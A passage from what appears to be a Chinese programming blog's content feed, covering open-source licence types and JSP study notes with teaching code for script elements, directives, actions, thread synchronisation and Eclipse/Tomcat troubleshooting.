协议还有以下需要说明的地方：</p><ul><li><code>永久权利</code>：一旦被授权，永久拥有；</li><li><code>全球范围的权利</code>：在一个国家获得授权，适用于所有国家。假如你在美国，许可是从印度授权的，也没有问题；</li><li><code>授权免费，且无版税</code>：前期，后期均无任何费用；</li><li><code>授权无排他性</code>：任何人都可以获得授权；</li><li><code>授权不可撤消</code>：一旦获得授权，没有任何人可以取消。比如，你基于该产品代码开发了衍生产品，你不用担心会在某一天被禁止使用该代码；</li></ul><p><strong>采用该协议的代表作品</strong>：PyCharm、Kubernetes、TensorFlow、TypeScript、MathJax等</p><h3 id="Mozilla"><a href="#Mozilla" class="headerlink" title="Mozilla"></a>Mozilla</h3><p><code>Mozilla</code>全称为<code>Mozilla Public License</code>（Mozilla公共许可证），简称为MPL</p><h3 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h3><p><code>BSD</code>在软件分发方面的限制比别的开源协议（如 <code>GNU GPL</code>）要少。该协议有多种版本，最主要的版本有两个：</p><ul><li><code>新BSD协议</code>：<ul><li>在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制；</li><li>禁止拿开发者的名义为衍生产品背书，但简单 BSD 协议删除了这一条款</li></ul></li><li><code>简单BSD协议</code>：<ul><li>在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制；</li></ul></li></ul><p><strong>采用该协议的代表作品</strong>：React、Tor、Go、V8（JavaScript引擎）、Homebrew等</p><h2 id="三、选择拓扑图"><a href="#三、选择拓扑图" class="headerlink" title="三、选择拓扑图"></a>三、选择拓扑图</h2><p><img src="/assets/images/licence-topology.png" alt="协议选择拓扑图" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 许可证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP页面执行过程-JSP笔记-4</title>
      <link href="/2016/12/02/jsp-4/"/>
      <url>/2016/12/02/jsp-4/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><blockquote><p>整体过程感受：</p></blockquote><p>当我们请求WEB容器中的JSP页面时，WEB容器便将被访问的页面交给JSP引擎去处理。Tomcat中的JSP引擎就是一个Servlet程序，它负责解释和执行JSP页面。</p><p>每个JSP页面在第一次被访问时，JSP引擎先将它翻译成一个Servlet源程序，接着再把这个Servlet源程序编译成Servlet的class类文件，然后再由WEB容器像调用普通Servlet程序一样的方式来装载和解释执行这个由JSP页面翻译成的Servlet程序。</p><p>由于每台服务器的环境不同，具体的由Tomcat中的JSP引擎转译的源码地址也就不一样。在我本机的环境中，我可以通过查看控制台的相关提示，就可以快速找到与我项目中jsp文件对应的java文件和class文件。示例图如下。(当然如果你实在想了很多办法也没能找到jsp转译的相关文件位置，那就用最笨的方法，来个具体盘搜索，或者直接来个全盘搜索，搜索格式为：jsp文件名+_jsp+.java)</p><p><img src="/assets/images/jsp-4-1.jpg" alt="Console Infos" loading="lazy"></p><blockquote><p>JSP的具体执行过程如下：</p></blockquote><ol><li>客户端发出请求。</li><li>Web容器将JSP转译成Servlet源代码。</li><li>Web容器将产生的源代码进行编译。</li><li>把执行结果响应至客户端。</li></ol><blockquote><p>总结如下：</p></blockquote><p>JSP执行过程：</p><ol><li>首先，客户端发出请求(request )，请求访问JSP网页</li><li>接着，JSP Container将要访问的.JSP文件 转译成Servlet的源代码（.java文件）</li><li>然后，将产生的Servlet的源代码（.java文件）经过编译，生成.class文件，并加载到内存执行</li><li>最后把结果响应(response )给客户端</li></ol><p>补充：执行JSP网页文件时，需要经过两个时期：转译时期(TranslationTime)和请求时期(RequestTime)。</p><ul><li><p>转译时期：JSP转译成Servlet类(.class文件)。</p><ul><li>将JSP网页转译为Servlet源代码(.java)，此段称为转译时期(Translation time)；将JSP网页转译为Servlet源代码(.java)，此段称为转译时期(Translation time)；</li><li>将Servlet源代码(.java)编译成Servlet类(.class)，此阶段称为编译时期(Compilation time)。<br>其实，JSP就是一个Servlet。</li></ul></li><li><p>请求时期：Servlet类(.class文件)执行后，响应结果至客户端。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP脚本元素指令与动作JSP笔记-5</title>
      <link href="/2016/12/02/jsp-5/"/>
      <url>/2016/12/02/jsp-5/</url>
      
        <content type="html"><![CDATA[<h2 id="一、JSP脚本元素："><a href="#一、JSP脚本元素：" class="headerlink" title="一、JSP脚本元素："></a>一、JSP脚本元素：</h2><p>由于都是在一定的格式里起纳入Java代码，因此经常把“表达式”、Scriptlet、“声明”都称为脚本元素。</p><h3 id="1-1、JSP表达式："><a href="#1-1、JSP表达式：" class="headerlink" title="1.1、JSP表达式："></a>1.1、JSP表达式：</h3><p>JSP表达式是对数据的表示，系统将其作为一个值进行计算和显示。示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;jspDemo1.jsp&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;JSP表达式 示例&lt;/h1&gt;<br>    &lt;!-- 常量,方法值,算术运算,关系运算 --&gt;<br>    &lt;b&gt;PI 的值： &lt;/b&gt;&lt;%=Math.PI %&gt;&lt;br /&gt;<br>    &lt;b&gt;<span class="hljs-number">100</span>,<span class="hljs-number">99</span>中最大的值 :&lt;/b&gt;&lt;%=Math.max(<span class="hljs-number">100</span>,<span class="hljs-number">99</span>) %&gt;&lt;br /&gt;<br>    &lt;b&gt;<span class="hljs-number">100</span>,<span class="hljs-number">99</span>中最小的值 :&lt;/b&gt;&lt;%=Math.min(<span class="hljs-number">100</span>,<span class="hljs-number">99</span>) %&gt;&lt;br /&gt;<br>    &lt;b&gt;<span class="hljs-number">3</span>+<span class="hljs-number">2</span>-<span class="hljs-number">5</span>的值 :&lt;/b&gt;&lt;%=<span class="hljs-number">3</span>+<span class="hljs-number">2</span>-<span class="hljs-number">5</span> %&gt;&lt;br /&gt;<br>    &lt;b&gt;(<span class="hljs-number">3</span>+<span class="hljs-number">2</span>)==<span class="hljs-number">5</span>的值 :&lt;/b&gt;&lt;%=(<span class="hljs-number">3</span>+<span class="hljs-number">2</span>)==<span class="hljs-number">5</span> %&gt;&lt;br/&gt;<br>    &lt;b&gt;(<span class="hljs-number">3</span>+<span class="hljs-number">2</span>)!=<span class="hljs-number">5</span>的值(表达式输出) :&lt;/b&gt;&lt;%=(<span class="hljs-number">3</span>+<span class="hljs-number">2</span>)!=<span class="hljs-number">5</span> %&gt;&lt;br /&gt;<br>    &lt;!-- out.print() 与表达式作用类似 --&gt;<br>    &lt;b&gt;&lt;%out.println(<span class="hljs-string">&quot;(3+2)!=5的值(out.print输出) :&quot;</span>+((<span class="hljs-number">3</span>+<span class="hljs-number">2</span>)!=<span class="hljs-number">5</span>)); %&gt;&lt;br/&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="1-2、JSP-Scriptlet："><a href="#1-2、JSP-Scriptlet：" class="headerlink" title="1.2、JSP Scriptlet："></a>1.2、JSP Scriptlet：</h3><p>JSP Scriptlet就是在JSP页面里面嵌入一段Java代码，也成为脚本代码段，它在JSP页面中的表现形式为:&lt;% Java代码 %&gt;，代码示例如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;jspDemo2.jsp&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;java 程序片 示例&lt;/h1&gt;<br>    &lt;%<br>      <span class="hljs-comment">//java程序片 定义一个变量 (结论:局部变量,反复声明,数值不变)</span><br>      <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>      i++;<br>     %&gt;<br>     &lt;h1&gt;你是第&lt;%=i %&gt;个访问本站的用户&lt;/h1&gt;<br>     &lt;br&gt;<br>     &lt;!-- java 程序片 写具体代码 --&gt;<br>     &lt;h1&gt;以直角三角形的形式显示数字&lt;/h1&gt;<br>     &lt;%<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;<span class="hljs-number">10</span>;k++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=k;j++) &#123;<br>           out.println(j);<br>        &#125;<br>     out.println(<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>    &#125;<br>      %&gt;<br>      &lt;h1&gt;计算<span class="hljs-number">1</span>到<span class="hljs-number">100</span>的和&lt;/h1&gt;<br>      &lt;%<br>        <span class="hljs-comment">//计算1到100的和</span><br>    <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;=<span class="hljs-number">100</span>;k++)&#123;<br>    sum+=k;<br>    &#125;<br>    out.println(<span class="hljs-string">&quot;sum=&quot;</span>+sum);<br>      %&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="1-3、JSP声明："><a href="#1-3、JSP声明：" class="headerlink" title="1.3、JSP声明："></a>1.3、JSP声明：</h3><p>JSP声明就是在JSP页面中声明Java方法或变量等(用于定义JSP代表的Servlet类的成员变量和方法)。JSP声明在JSP页面中的表现形式为：&lt;%! Java 代码 %&gt;，实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;jspDemo3.jsp&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;java 声明变量和方法 示例&lt;/h1&gt;<br>&lt;%!<span class="hljs-comment">//声明变量 变量类型为java允许的任何类型 (结论:全局变量即类的成员变量,只声明一次,i数值递增)</span><br><span class="hljs-type">int</span> i, a, b = <span class="hljs-number">10</span>, c;<br><span class="hljs-type">String</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>, jerry = <span class="hljs-string">&quot;love JSP&quot;</span>;<br>Date date;<br><span class="hljs-comment">//声明方法</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,&quot;</span> + name + <span class="hljs-string">&quot;!&quot;</span>;<br>&#125;%&gt;<br>&lt;%<br>i++;<br><span class="hljs-comment">//给变量进行赋值操作</span><br>date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>%&gt;<br>&lt;h1&gt;<br>你是第&lt;%=i%&gt;个访问本站的用户<br>&lt;/h1&gt;<br>&lt;br&gt;&lt;%=jerry%&gt;<br>&lt;br&gt;&lt;%=tom%&gt;<br>&lt;br&gt;&lt;%=date%&gt;<br>&lt;br&gt;&lt;%=sayHello(<span class="hljs-string">&quot;zhangsan&quot;</span>)%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><strong>有个问题：</strong></p><p>当两个或多个线程同时访问同一个共享的变量时，并且一个线程需要修改这个变量时，我们应对这样的问题做出处理，否则可能发生混乱。根据Tomcat服务器的机制，Tomcat会为每个访问网站的用户开启一个新的线程，当多个用户同时请求一个JSP页面时，JSP页面的程序片（&lt;%  %&gt;中的）就会被多次调用运行，分别运行在不同的线程中，JSP页面的成员变量和方法（&lt;%! %&gt;）会被多个用户共享和访问。有些JSP页面的方法在操作成员变量，可能不需要被其他用户影响，以免产生不利影响，那么就要使用线程同步了，相当于加了一把锁。这样就能保障不同的用户对于同一个数据的处理时，不会发生混乱。</p><p><strong>synchronized修饰的作用为：当一个线程在执行被synchronized修饰的方法时，其他线程想在程序片中调用这个synchronized修饰的方法时就必须等待，直等到方法执行完。</strong></p><p>关于线程同步的方法有两种：</p><p>1.使用同步块进行线程同步：<code>synchronized(object){要同步的语句}</code>，实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;关于线程同步的两个措施&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;<span class="hljs-keyword">synchronized</span>块 实现线程同步&lt;/p&gt;<br>&lt;%! <br><span class="hljs-comment">//声明Integer 对象</span><br>Integer number=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">0</span>);<br>%&gt;<br>&lt;% <br><span class="hljs-comment">//把i++操作放入synchronized块中</span><br><span class="hljs-keyword">synchronized</span>(number)<br>&#123;<br>Thread.sleep(<span class="hljs-number">5000</span>);<br><span class="hljs-type">int</span> i=number.intValue();<br>i++;<br>number=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i);<br>&#125;<br>%&gt;<br>&lt;P&gt;您是第&lt;%=number.intValue()%&gt;个访问本站的客户。<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>2.使用同步方法进行线程同步：<code>synchronized void methodA(){}</code>,实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;jspDemo3_2.jsp&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;方法前加<span class="hljs-keyword">synchronized</span>关键字 实现线程同步&lt;/h1&gt;<br>&lt;%!<span class="hljs-comment">//定义变量</span><br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//声明方法 </span><br><span class="hljs-comment">//public void countPeople() </span><br><span class="hljs-comment">//synchronized修饰方法</span><br><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">countPeople</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>Thread.sleep(<span class="hljs-number">5000</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">try&#123;</span><br><span class="hljs-comment">Thread.sleep(5000);</span><br><span class="hljs-comment">&#125;catch(Exception e)&#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br>i++;<br>&#125;%&gt;<br>&lt;%<br>countPeople();<br>%&gt;<br>&lt;P&gt;<br>您是第&lt;%=i%&gt;个访问本站的客户。<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="二、JSP指令："><a href="#二、JSP指令：" class="headerlink" title="二、JSP指令："></a>二、JSP指令：</h2><p>(编译指令)相当于在编译期间的命令(换句话说jsp转换成Servlet过程期间需要用到的指令)，其中JSP指令包括page、include、taglib等。</p><h3 id="2-1、page指令："><a href="#2-1、page指令：" class="headerlink" title="2.1、page指令："></a>2.1、page指令：</h3><p>Page指令用来定义整个JSP页面的一些属性和这些属性的值。属性值总是用单引号或双引号括起来，可以用一个page指令制定多个属性的值，也可以用多个page为单个属性指定值。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//一个page指令制定多个属性的值</span><br>&lt;%@ page 属性<span class="hljs-number">1</span>=<span class="hljs-string">&quot;属性一的值&quot;</span> 属性<span class="hljs-number">2</span>=<span class="hljs-string">&quot;属性二的值&quot;</span> ... %&gt;<br><span class="hljs-comment">//多个page指令制定多个属性的值</span><br>&lt;%@ page 属性<span class="hljs-number">1</span>=<span class="hljs-string">&quot;属性一的值&quot;</span>%&gt;<br>&lt;%@ page 属性<span class="hljs-number">2</span>=<span class="hljs-string">&quot;属性二的值&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><p>另外page指令常用与进行错误页面的跳转，这其中一定会包括两个页面，一个是出错的页面，一个是出错后要跳转到的页面，部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//出错页面的page指令信息</span><br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> errorPage=<span class="hljs-string">&quot;error.jsp&quot;</span> %&gt;<br><br><span class="hljs-comment">//出错后跳转到的页面的page指令信息</span><br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> isErrorPage=<span class="hljs-string">&quot;true&quot;</span> %&gt;<br></code></pre></td></tr></table></figure><h3 id="2-2、include指令："><a href="#2-2、include指令：" class="headerlink" title="2.2、include指令："></a>2.2、include指令：</h3><p>include指令用于在运行时将html文件或者jsp页面嵌入到另一个jsp页面(为了代码的复用，写好的jsp页面可以被所有的其他jsp页面进行银行用)，部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%--<br>  include指令包含,静态包含特点:<br>  <span class="hljs-number">1</span>,先包含后处理,生成一个servlet类.<br>    即当前jsp页面和插入的文件合并成一个新的jsp文件,然后JSP引擎再将这个新的JSP页面转译成java文件<br>  <span class="hljs-number">2</span>,只生成一个class文件<br>  <span class="hljs-number">3</span>,不能传参数<br>  <span class="hljs-number">4</span>,同一个request对象<br>  --%&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;includeDemo1.jsp&lt;/h1&gt;<br>    &lt;!-- 特点<span class="hljs-number">1</span>:包含文件定义变量i,被包含文件定义相同变量i时,报错 原因:先包含后处理,定义变量重复--&gt;<br>    &lt;%<br>       <span class="hljs-type">int</span> i=<span class="hljs-number">100</span>;<br>     %&gt;<br>     i=&lt;%=i %&gt;<br>    &lt;br&gt;<br>    &lt;!--  特点<span class="hljs-number">2</span>:查看work下项目的临时文件--&gt;<br>&lt;!-- 特点<span class="hljs-number">3</span>:不能传参数 --&gt;<br>    &lt;!--  特点<span class="hljs-number">4</span>:包含页面和被包含页面访问的是同一个request内嵌对象--&gt;<br>&lt;%request.setAttribute(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;xiaoming&quot;</span>);%&gt;<br>&lt;%System.out.println(<span class="hljs-string">&quot;includeDemo1.jsp中request=&quot;</span>+request); %&gt;<br>&lt;%<span class="hljs-meta">@include</span> file=<span class="hljs-string">&quot;include1.jsp&quot;</span> %&gt; <br><br>  &lt;/body&gt;<br></code></pre></td></tr></table></figure><h3 id="2-3、taglib指令："><a href="#2-3、taglib指令：" class="headerlink" title="2.3、taglib指令："></a>2.3、taglib指令：</h3><p>taglib指令的作用是在jsp页面中，将<code>标签库描述符文件</code>引入到该页面中，并设置前缀，而去利用标签的<code>前缀</code>去使用标签库表述文件中的标签。部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;!-- 引入JSTL标签 --&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;c&quot;</span> uri=<span class="hljs-string">&quot;http://java.sun.com/jstl/core&quot;</span> %&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;taglib标签引用&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;c:out value=<span class="hljs-string">&quot;欢迎测试你的第一个使用到JSTL的网页&quot;</span>/&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="三、JSP动作"><a href="#三、JSP动作" class="headerlink" title="三、JSP动作"></a>三、JSP动作</h2><p>jsp动作包括include，param，forward，plugin，useBean等动作，详细介绍如下所示：</p><h3 id="3-1、param动作："><a href="#3-1、param动作：" class="headerlink" title="3.1、param动作："></a>3.1、param动作：</h3><p>param标签以“名字–值”对的形式为其他标签提供附加信息，这个标签与jsp:include、jsp:forward、jsp:plugin标签一起使用。param动作标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:param name=<span class="hljs-string">&quot;名字&quot;</span> value=<span class="hljs-string">&quot;指定param的值&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><h3 id="3-2、include动作："><a href="#3-2、include动作：" class="headerlink" title="3.2、include动作："></a>3.2、include动作：</h3><p>include动作的特点为：</p><ol><li>先处理后包含,生成多个servlet类。即能自动区分包含的文件是静态文件还是动态文件；执行时,如果为静态文件,直接将资源包含处理,与静态包含相同；如果为动态文件,则选各自处理资源,之后将处理后的结果包含在一起。</li><li>生成多个class文件</li><li>能传参数</li><li>不同一个request对象,可以取得包含它的页面的参数,并添加了自己的参数</li></ol><p>include动作的标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:include page=<span class="hljs-string">&quot;文件的URL&quot;</span> /&gt;<br>或者<br>&lt;jsp:include page=<span class="hljs-string">&quot;文件的URL&quot;</span>&gt;<br>&lt;/jsp:include&gt;<br></code></pre></td></tr></table></figure><h3 id="3-3、动态include和静态include的区别如下："><a href="#3-3、动态include和静态include的区别如下：" class="headerlink" title="3.3、动态include和静态include的区别如下："></a>3.3、动态include和静态include的区别如下：</h3><ol><li><code>&lt;%@ include file=&quot;date.jsp&quot; %&gt;</code></li></ol><ul><li>include编译指令是在jsp程序的转换时期就将file属性所制定的程序内容嵌入，然后再编译执行；</li><li>只生成一个class文件</li><li>include不能带参数</li><li>同一个request对象</li></ul><ol start="2"><li><code>&lt;jsp:include page=&quot;date.jsp&quot; flush=&quot;true&quot; /&gt;</code></li></ol><ul><li>而include指令在转换期间是不会被编译的，只有在客户端请求时期如果被执行到才会被动态的编译载入。</li><li>生成多个class文件</li><li><a href="jsp:include">jsp:include</a>可以</li><li>不同的request对象，可以去的包含他的页面的参数，并添加了自己的参数。</li></ul><h3 id="3-4、forward动作："><a href="#3-4、forward动作：" class="headerlink" title="3.4、forward动作："></a>3.4、forward动作：</h3><p>forward的动作标记语法格式：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:forward page=<span class="hljs-string">&quot;文件的URL&quot;</span> /&gt;<br>或者<br>&lt;jsp:forward page=<span class="hljs-string">&quot;文件的URL&quot;</span>&gt;<br><span class="hljs-comment">//可以在forward中进行传参操作</span><br>&lt;jsp:param name=<span class="hljs-string">&quot;参数名称&quot;</span> value=<span class="hljs-string">&quot;参数值&quot;</span>/&gt;<br>&lt;/jsp:forward&gt;<br></code></pre></td></tr></table></figure><h3 id="3-5、plugin动作："><a href="#3-5、plugin动作：" class="headerlink" title="3.5、plugin动作："></a>3.5、plugin动作：</h3><p>plugin标签只是jsp文件加载java plugin，该插件由客户负责下载，并使用该插件负责下载，并使用该插件来运行java applet，其中plugin动作标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;jsp:plugin type=<span class="hljs-string">&quot;applet&quot;</span> code=<span class="hljs-string">&quot;小应用程序的字节码文件&quot;</span> jreversion=<span class="hljs-string">&quot;java虚拟机版本号&quot;</span> width=<span class="hljs-string">&quot;小程序宽度值&quot;</span> height=<span class="hljs-string">&quot;小程序口高度值&quot;</span>&gt;<br>  &lt;jsp:fallback&gt;<br>     提示信息：用来提示用户的浏览器是否支持插件下载。<br>  &lt;/jsp:fallback&gt;<br>&lt;/jsp:plugin&gt;<br></code></pre></td></tr></table></figure><h3 id="3-6、useBean动作："><a href="#3-6、useBean动作：" class="headerlink" title="3.6、useBean动作："></a>3.6、useBean动作：</h3><p>useBean标签用来创建并使用一个java beans，是非常重要的一个动作标签。sun公司的倡导是：用html完成jsp页面的静态部分，用javabeans完成动态部分，实现真正意义上的静态和动态分割。</p>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP使用中问题汇总</title>
      <link href="/2016/12/01/jsp-problem/"/>
      <url>/2016/12/01/jsp-problem/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明："><a href="#一、说明：" class="headerlink" title="一、说明："></a>一、说明：</h2><p>本篇主要说明在我学习JSP的相关过程中，遇到的最凸显的一些问题，肯定附带一些IDE工具(这里主要是Eclipse)的一些问题，为了方便查询，特此记录。我自身软件环境如下：</p><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)；</li><li>Apache Tomcat version: 8.5.8</li></ol><blockquote><p>###进入Servlet映射的虚拟路径的404错误问题</p></blockquote><p>我发现在使用Eclipse利用servlet3.0及以上的版本写虚拟路径映射的时候，默认没有web.xml的时候(当然与这无关)，在路径都书写正确的情况下始终无法进入对应的路径，Eclipse的控制台提示错误为：</p><p><code>[SetPropertiesRule]{Server/Service/Engine/Host/Context} Setting property &#39;source&#39; to &#39;org.eclipse.jst.jee.server:Test&#39; did not find a matching property.</code></p><p>浏览器会提示404错误，我系统默认浏览器与Eclipse的Internal Web Browser都是这个错误。错误如下图所示：</p><p><img src="/assets/images/jsp-pb-1.jpg" alt="404 Error in Chrome" loading="lazy"><br><img src="/assets/images/jsp-pb-2.jpg" alt="404 Error in Self Browser" loading="lazy"></p><p>然后我尝试选择附带web.xml的情况下重建工程，依旧会出现这个错误，最后经过一番查找，发现原因应该是Tomcat6.0及以后的版本中的server.xml的context节点中不支持source属性，我在官网找到如下信息：</p><p><img src="/assets/images/jsp-pb-3.jpg" alt="Tomcat6.0 Not Support &quot;Source&quot;" loading="lazy"></p><p>其中最主要的一句好像是：</p><p><code>It is NOT recommended to place &lt;Context&gt; elements directly in the server.xml file. This is because it makes modifying the Context configuration more invasive since the main conf/server.xml file cannot be reloaded without restarting Tomcat.</code></p><p>解决方法为：<br>这里通过修改Tomcat server配置，首先关闭server，然后在server视图中双击server，打开配置界面，选中下面的”Publish module contexts to separate XML files”，保存退出。如下图所示，重启Eclipse即可!</p><p>解决办法的网络参考：<a href="http://siruoxian.iteye.com/blog/1103347">http://siruoxian.iteye.com/blog/1103347</a></p><p><img src="/assets/images/jsp-pb-4.jpg" alt="Change Tomcat Server Config" loading="lazy"></p><hr><blockquote><p>###在Servlet使用过程中的编码问题</p></blockquote><p>这里不讨论各种编码方式的优缺点，这里只是说明我们在日常使用过程中出现的编码问题，这也是最让人头痛的问题。我使用的UTF-8编码。<br>我们在使用Eclipse进行项目的时候，比如说吧，我说一下我曾记出现的一个问题。</p><p>响应为http的post响应请求，当然这里http的响应请求方式无所谓，然后是我的页面显示编码全部规定是UTF-8，即<code>resp.setHeader(&quot;Content-type&quot;, &quot;text/html;charset=UTF-8&quot;);</code>，resp为HttpServletResponse对象类型，但是我并没有设置<code>req.setCharacterEncoding(&quot;UTF-8&quot;);</code>，此处的req为HttpServletRequest对象，然后我发现，页面的显示就会出现乱码。</p><p>这是我遇到的问题一，还有一个更严重的问题就是页面实际使用的编码与你要求页面显示的编码方式不统一，由于Eclipse本身默认的文本编码为GBK，并且我们在Eclipse中建立的各种工程全部是继承系统默认的文本编码方式，但是我经常使用的页面编码显示为UTF-8，这就会出现意想不到的问题，为了解决这一问题，我强烈建议，你想让页面以什么编码方式显示，一定要用该编码编辑该文本，其中Eclipse的编码设置位置，如下图所示：</p><p><img src="/assets/images/jsp-pb-5.jpg" alt="Change Text Coding" loading="lazy"></p><hr><blockquote><p>###Eclipse的汉化方法</p></blockquote><p>虽然说使用英文的IDE可以不断的锻炼自己的英文水平，并且能够避免很多错译，或者语言文件本身存在的bug导致软件无法正常的运行等等问题。</p><p>但是，但是，因为Eclipse本身软件的影响力，其官方的汉化文件已经做得非常好了，IDE本身的汉化比已经达到80%多，加上英文IDE本身给人的恐惧心理，让我们没法深入探索这个IDE工具的有趣之处，我们可能只是按需的在这款软件内依次点击那几个按钮，完成老师交代的那一丁丁任务而已，我们也只是稍微碰过这款软件，也许是因为英文而没有那种想去探索的勇气，一个英文不好的人去用，的却会浪费很多时间，最起码我是因为英文不想去接触，说实话，我有点怕麻烦，进入正题，汉化过程如下：</p><p>访问Eclipse的官网语言下载链接：<a href="https://www.eclipse.org/babel/downloads.php">这里</a>；然后我们选择对应我们IDE的语言包进行下载，如下图所示：</p><p><img src="/assets/images/jsp-pb-6.jpg" alt="IDE Language Pack" 